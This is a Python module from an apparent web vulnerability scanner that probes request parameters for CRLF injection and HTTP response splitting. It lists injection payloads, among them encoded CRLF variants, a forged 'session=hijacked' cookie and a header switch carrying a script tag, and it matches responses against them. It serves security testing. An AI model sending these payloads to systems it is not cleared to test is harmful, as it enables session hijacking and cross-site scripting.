"""
mod_crlf.py — CRLF Injection / HTTP Response Splitting detection module.

Covers:
  • CRLF injection via parameter values (injecting \r\n into headers)
  • HTTP Response Splitting
  • Header injection
"""

import re
import logging
from typing import Any, Dict, List

from my_scan.modules.base import BaseModule, HIGH, MEDIUM

logger = logging.getLogger("mod_crlf")

# ── Payloads ─────────────────────────────────────────────────────────────────

# Marker header we inject to confirm CRLF is processed
MARKER = "X-Scanner-Injected: crlf-test"

CRLF_PAYLOADS = [
    # Classic CRLF
    f"http://example.com\r\n{MARKER}",
    f"value\r\n{MARKER}",
    f"value\r\nX-XSS: 1",
    # URL-encoded CRLF
    f"value%0d%0a{MARKER.replace(' ', '%20').replace(':', '%3A')}",
    f"value%0d%0aX-Injected:%20yes",
    # Double URL-encoded
    f"value%250d%250aX-Injected:%20yes",
    # Unicode variants
    f"value\u000d\u000a{MARKER}",
    f"value%E5%98%8D%E5%98%8A{MARKER}",     # UTF-8 encoded CRLF
    # LF only
    f"value\nX-Injected: lf-only",
    f"value%0aX-Injected:%20lf-only",
    # Set-Cookie injection
    f"value\r\nSet-Cookie: session=hijacked",
    f"value%0d%0aSet-Cookie:%20session%3Dhijacked",
    # Content-Type switching (for XSS via CRLF)
    f"value\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
]

# ── Detection helpers ─────────────────────────────────────────────────────────

INJECTED_HEADER_PATTERN = re.compile(r"x-scanner-injected|x-injected|x-xss", re.IGNORECASE)
SET_COOKIE_INJECTION    = re.compile(r"session=hijacked", re.IGNORECASE)


class CRLFModule(BaseModule):
    name        = "crlf"
    description = "Detects CRLF Injection and HTTP Response Splitting vulnerabilities"

    async def run(self, entrypoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        params = self._all_params(entrypoint)

        if not params:
            return findings

        for param_name in params:
            for payload in CRLF_PAYLOADS:
                ep   = self._inject_param(entrypoint, param_name, payload)
                resp = await self._send(ep, allow_redirects=False)
                if resp is None:
                    continue
                try:
                    body    = await resp.text()
                    headers = dict(resp.headers)
                finally:
                    resp.release()

                # Check if our injected header appears in the response headers
                for hname, hval in headers.items():
                    if INJECTED_HEADER_PATTERN.match(hname):
                        findings.append(self._make_finding(
                            vulnerability="CRLF Injection / HTTP Response Splitting",
                            vuln_id="crlf",
                            severity=HIGH,
                            url=entrypoint["url"],
                            method=entrypoint.get("method", "GET"),
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Injected header '{hname}: {hval}' appeared in response",
                        ))
                        break

                # Check for injected Set-Cookie
                set_cookie = headers.get("Set-Cookie", "")
                if SET_COOKIE_INJECTION.search(set_cookie):
                    findings.append(self._make_finding(
                        vulnerability="CRLF Injection (Cookie Injection)",
                        vuln_id="crlf",
                        severity=HIGH,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Injected Set-Cookie header found: {set_cookie!r}",
                    ))
                    break

                # Check if payload literally appears in body (possible response split)
                if MARKER in body:
                    findings.append(self._make_finding(
                        vulnerability="CRLF Injection (Response Body Reflection)",
                        vuln_id="crlf",
                        severity=MEDIUM,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence="Injected CRLF marker reflected in response body",
                    ))
                    break

        return findings

    # ------------------------------------------------------------------
    def _all_params(self, ep: Dict[str, Any]) -> List[str]:
        names: List[str] = []
        if ep.get("params"):
            names += list(ep["params"].keys())
        body = ep.get("body", "") or ""
        if body:
            import json as _j
            from urllib.parse import parse_qs as _pqs
            try:
                bd = _j.loads(body)
                if isinstance(bd, dict):
                    names += [k for k in bd if k not in names]
            except Exception:
                pass
            try:
                for k in _pqs(body):
                    if k not in names:
                        names.append(k)
            except Exception:
                pass
        return names
